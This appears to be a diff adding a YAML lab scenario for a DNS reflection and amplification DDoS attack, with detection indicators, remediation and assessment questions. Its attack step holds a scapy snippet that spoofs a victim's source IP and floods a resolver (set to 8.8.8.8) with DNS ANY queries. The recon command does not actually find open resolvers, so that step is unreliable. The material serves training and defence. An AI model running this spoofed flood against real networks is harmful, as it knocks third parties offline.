@@ -1,0 +1,103 @@
+# Category: DDoS & DoS
+name: "DNS Amplification Attack – Reflection and Amplification"
+id: "ddos-dns-amplification-001"
+category: "ddos"
+subcategory: "amplification"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Use open DNS resolvers to launch a reflection/amplification DDoS attack.
+  By sending small DNS queries with a spoofed source IP (the victim), the
+  attacker can direct large DNS responses to the victim, saturating their
+  bandwidth.
+
+learning_objectives:
+  - Understand DNS reflection and amplification
+  - Identify open DNS resolvers using tools like dnsrecon
+  - Craft spoofed DNS queries (using scapy)
+  - Launch a test attack (for educational purposes only)
+
+tools:
+  - scapy (Python)
+  - dnsrecon (for open resolver scanning)
+  - dnsmap
+  - open resolver lists
+
+prerequisites:
+  - Understanding of UDP spoofing
+  - Permission to perform tests (authorized environment)
+  - Python and scapy installed
+
+steps:
+  - id: "step1"
+    phase: "recon"
+    action: "Find open resolvers"
+    commands:
+      - "# Use dnsrecon"
+      - "dnsrecon -d example.com -t brt -D list.txt"
+      - "# Or check known open resolver lists"
+    expected_output: "List of IPs that respond to DNS queries"
+    detection: "Open resolver scanning may be logged"
+
+  - id: "step2"
+    phase: "craft_attack"
+    action: "Send spoofed DNS queries"
+    commands:
+      - "# Scapy script"
+      - "from scapy.all import *"
+      - "ip = IP(src=target, dst=resolver)"
+      - "udp = UDP(sport=12345, dport=53)"
+      - "dns = DNS(id=1, qr=0, opcode=0, qd=DNSQR(qname='example.com', qtype='ANY'))"
+      - "send(ip/udp/dns, count=1000)"
+    expected_output: "Large DNS responses sent to target"
+    detection: "Network logs show high volume of DNS traffic"
+
+  - id: "step3"
+    phase: "impact"
+    action: "Monitor target's bandwidth saturation"
+    commands:
+      - "# Use netstat or SNMP to see traffic spike"
+    expected_output: "Bandwidth usage exceeds normal"
+    detection: "DDoS detection systems alert"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1498"
+    description: "Network Denial of Service"
+  - standard: "NIST SP 800-53"
+    control: "SC-5"
+    description: "Denial of Service Protection"
+
+detection:
+  network_indicators:
+    - "High volume of UDP traffic to port 53"
+    - "Spoofed source IPs (asymmetric routing)"
+  log_indicators:
+    - "DNS query logs with ANY requests"
+  endpoint_indicators:
+    - "scapy usage"
+
+remediation:
+  immediate:
+    - "Contact ISP to filter spoofed traffic"
+    - "Use anycast and cloud DDoS mitigation services"
+  long_term:
+    - "Deploy rate limiting and connection tracking"
+    - "Close open DNS resolvers"
+
+variables:
+  target_ip: "10.0.0.1"
+  resolver_ip: "8.8.8.8"
+  query_domain: "example.com"
+
+assessment_questions:
+  - "What is the amplification factor of a DNS ANY query?"
+  - "How can you prevent your DNS server from being used in amplification attacks?"
+  - "What is the difference between reflection and amplification?"
+
+references:
+  - url: "https://www.us-cert.gov/ncas/alerts/TA13-088A"
+    title: "DNS Amplification Attacks"
+  - url: "https://scapy.readthedocs.io/"
+    title: "Scapy Documentation"
